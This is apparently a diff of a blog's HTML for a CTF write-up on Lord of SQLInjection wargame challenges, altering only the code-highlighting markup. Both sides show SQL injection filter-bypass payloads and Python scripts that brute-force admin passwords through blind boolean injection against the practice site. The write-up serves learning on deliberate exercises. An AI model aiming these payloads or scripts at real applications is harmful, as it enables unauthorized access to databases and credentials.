+            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; or substr(pw,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+        }
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            pw <span style="color:#f92672">+=</span> c
+            print(pw)
+            <span style="color:#66d9ef">break</span>
+<span style="color:#75715e">#pw=095a9852</span>
+</code></pre></div><hr>
 
 
 
@@ -496,8 +496,8 @@ Nice, exploit &hellip;</p>
 Review the code, I see it filter space. My mission is bypass it, and force the id return <code>admin</code>.
 Learn from previous challenge, <code>union</code> is command helpful.
 With <code>space</code> we can replace by comment syntax <code>/**/</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>    <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_wolfman <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/**/</span><span style="color:#e6db74">&#39;admin&#39;</span>
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_wolfman <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/**/</span><span style="color:#e6db74">&#39;admin&#39;</span>
+</code></pre></div>
 
 
 
@@ -566,12 +566,12 @@ It means we can use &lsquo;Admin&rsquo; instead of &lsquo;admin&rsquo;</p>
   <h3 id="vampire"><a class="anchor" href="#vampire" title='Anchor for: vampire.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> vampire</h3> 
 
 <p>I wake up at 6 o&rsquo;clock and feel so full of energy, have breakfast and play CTF :)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$_GET[<span style="color:#a6e22e">id</span>]);
-</span></span></code></pre></div><p>This chall replace &lsquo;admin&rsquo; string, it not hard to bypass it.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$_GET[<span style="color:#a6e22e">id</span>]);
+</code></pre></div><p>This chall replace &lsquo;admin&rsquo; string, it not hard to bypass it.
 Because <code>str_replace</code> function is not recursive, so you can write <code>adadminmin</code>, and when it replace <code>admin</code> it becomes to <code>ad</code>admin<code>min</code>.</p>
 <p>So the payload will be:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>adadminmin
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>adadminmin
+</code></pre></div>
 
 
 
@@ -597,34 +597,34 @@ Because <code>str_replace</code> function is not recursive, so you can write <co
 <p>Use <a href="#orc">orc</a> idea, but replace <code>or</code> by <code>||</code>; <code>and</code> by <code>&amp;&amp;</code>.
 Author add filter <code>substr</code> and <code>=</code> so i think a couple of hours, i found <code>like</code> is useful to replace <code>=</code>.</p>
 <p>Nice, but how use it?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- return hello admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7%&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- return hello admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7a%&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- return not anything
-</span></span></span></code></pre></div><p>My code to solve this challenge:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ?pw=&#39; || (id like (&#39;admin&#39;) &amp;&amp; length(pw) &gt; 8) || &#39; -- I extract length of pw is 8</span>
-</span></span><span style="display:flex;"><span>pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qckem3eou6njaopue0repj1g4l&#39;</span>
-</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; || id like &#39;admin&#39; &amp;&amp; pw like &#39;</span><span style="color:#e6db74">{</span>pw<span style="color:#f92672">+</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#34;</span>
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
-</span></span><span style="display:flex;"><span>            pw <span style="color:#f92672">+=</span> c
-</span></span><span style="display:flex;"><span>            print(pw)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%&#39;</span>
+<span style="color:#75715e">-- return hello admin
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7%&#39;</span>
+<span style="color:#75715e">-- return hello admin
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7a%&#39;</span>
+<span style="color:#75715e">-- return not anything
+</span></code></pre></div><p>My code to solve this challenge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php&#34;</span>
+<span style="color:#75715e"># ?pw=&#39; || (id like (&#39;admin&#39;) &amp;&amp; length(pw) &gt; 8) || &#39; -- I extract length of pw is 8</span>
+pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qckem3eou6njaopue0repj1g4l&#39;</span>
+cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
+req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
+        payload <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; || id like &#39;admin&#39; &amp;&amp; pw like &#39;</span><span style="color:#e6db74">{</span>pw<span style="color:#f92672">+</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#34;</span>
+        }
+        r <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            pw <span style="color:#f92672">+=</span> c
+            print(pw)
+            <span style="color:#66d9ef">break</span>
+</code></pre></div>
 
 
 
@@ -638,9 +638,9 @@ Author add filter <code>substr</code> and <code>=</code> so i think a couple of 
 <p>Use <a href="#golem">golem</a> idea.
 i replace <code>''</code> by <code>char()</code> , <code>substring()</code> by <code>left()</code>.</p>
 <p>Many ways, huh!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(id <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">102</span>))
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#f92672">=&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>b70ea1f
-</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(id <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">102</span>))
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">=&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>b70ea1f
+</code></pre></div><hr>
 
 
 
@@ -670,27 +670,27 @@ i replace <code>''</code> by <code>char()</code> , <code>substring()</code> by <
   <h3 id="buggear"><a class="anchor" href="#buggear" title='Anchor for: buggear.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> buggear</h3> 
 
 <p>Some filter is added.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>    substr,ascii,<span style="color:#f92672">=</span>,<span style="color:#66d9ef">or</span>,<span style="color:#66d9ef">and</span>, ,<span style="color:#66d9ef">like</span>,<span style="color:#ae81ff">0</span>x
-</span></span></code></pre></div><p>I search gg and find a function <code>instr</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    substr,ascii,<span style="color:#f92672">=</span>,<span style="color:#66d9ef">or</span>,<span style="color:#66d9ef">and</span>, ,<span style="color:#66d9ef">like</span>,<span style="color:#ae81ff">0</span>x
+</code></pre></div><p>I search gg and find a function <code>instr</code>.
 This function has 2 parameters <code>instr(a,b)</code> and return <code>Match Position</code></p>
 <p>if <code>b</code> not in <code>a</code>, it&rsquo;ll return 0, else return &gt; 0</p>
 <ul>
 <li>Part 1: combine <code>instr</code> + <code>char</code> we can <code>select id='admin'</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id) <span style="color:#75715e">-- return 1
-</span></span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id) <span style="color:#75715e">-- return 1
+</span></code></pre></div><ul>
 <li>Part 2: combine <code>left</code> + <code>char</code> + <code>instr</code> to brute password</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char([<span style="color:#ae81ff">48</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">57</span><span style="color:#f92672">|</span><span style="color:#ae81ff">97</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">122</span>]))
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char([<span style="color:#ae81ff">48</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">57</span><span style="color:#f92672">|</span><span style="color:#ae81ff">97</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">122</span>]))
+</code></pre></div><ul>
 <li>Part 3: craft payload:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char(<span style="color:#ae81ff">53</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">2</span>),char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">==&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span>dc3991
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char(<span style="color:#ae81ff">53</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+<span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">2</span>),char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+...
+<span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>)
+<span style="color:#f92672">==&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span>dc3991
+</code></pre></div>
 
 
 
@@ -751,17 +751,17 @@ The underscore sign (_) represents one, single character
 
 <p>The challenge is not hard, if you notice 2 param <code>id</code>,<code>pw</code>, you&rsquo;ll found solution.</p>
 <p>Review the code below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">id</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>); <span style="color:#75715e">// filter &#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>);
-</span></span><span style="display:flex;"><span>  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_succubus where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;succubus&#34;</span>);  <span style="color:#75715e">// anything return from $query
-</span></span></span></code></pre></div><p>Obviously, we can&rsquo;t use any condition command trick. Instead of, sign <code>\</code> is the best choice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">id</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>); <span style="color:#75715e">// filter &#39;
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>);
+  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_succubus where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
+  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;succubus&#34;</span>);  <span style="color:#75715e">// anything return from $query
+</span></code></pre></div><p>Obviously, we can&rsquo;t use any condition command trick. Instead of, sign <code>\</code> is the best choice.</p>
 <p>The payload will be look like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>    Payload : id<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&amp;</span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">or</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">-- -
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">Explain</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_succubus <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)-- -&#39;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- id=&#39;\&#39; and pw=&#39;,thus $_GET[pw] will be escaped
-</span></span></span></code></pre></div>
